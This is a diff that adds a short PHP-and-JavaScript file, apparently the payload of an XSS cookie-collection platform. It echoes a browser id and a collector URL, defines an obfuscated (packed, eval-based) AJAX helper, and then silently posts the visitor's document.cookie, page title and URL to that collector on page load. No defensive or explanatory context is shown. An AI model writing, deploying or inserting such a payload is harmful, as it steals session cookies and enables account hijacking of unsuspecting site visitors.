@@ -1,0 +1,6 @@
+<?php  echo  "var  bid={$browser->bid}; var xingUrl='".SITE_ROOT."index.php';"  ?>
+
+eval(function(p,a,c,k,e,r){e=function(c){return c.toString(36)};if('0'.replace(0,e)==0){while(c--)r[e(c)]=k[c];k=[function(e){return r[e]||e}];e=function(){return'[235-9b-df-np-u]'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('x=c.x||{d:3(){5(c.j){8 2=f j()}k 5(c.g){l{8 2=f g("Msxml2.m")}n(e){l{8 2=f g("Microsoft.m")}n(e){}}}h 2},i:3(2,6){2.onreadystatechange=3(){5(2.readyState==4){5(2.status==200){5(6)allback(2.responseText)}}}},p:3(o){5(typeof(o)==\'object\'){8 7=\'\';for(a in o){7+=a+\'=\'+o[a]+\'&\'}7=7.substr(0,7.length-1);h 7}k{h o}},q:3(9,6){2=x.d();2.r(\'q\',9,s);2.t(null);x.i(2,6)},u:3(9,b,6){2=x.d();2.r(\'u\',9,s);2.setRequestHeader(\'Content-Type\',\'application/x-www-form-urlencoded\');b=x.p(b);2.t(b);x.i(2,6)}}',[],31,'||ajax|function||if|callback|str|var|url||content|window|request||new|ActiveXObject|return|handle|XMLHttpRequest|else|try|XMLHTTP|catch||display|get|open|true|send|post'.split('|'),0,{}))
+ 
+ 
+  x.post(xingUrl+"?a=info",{bid:bid,title:document.title,url:escape(document.URL),cookie:document.cookie}); 
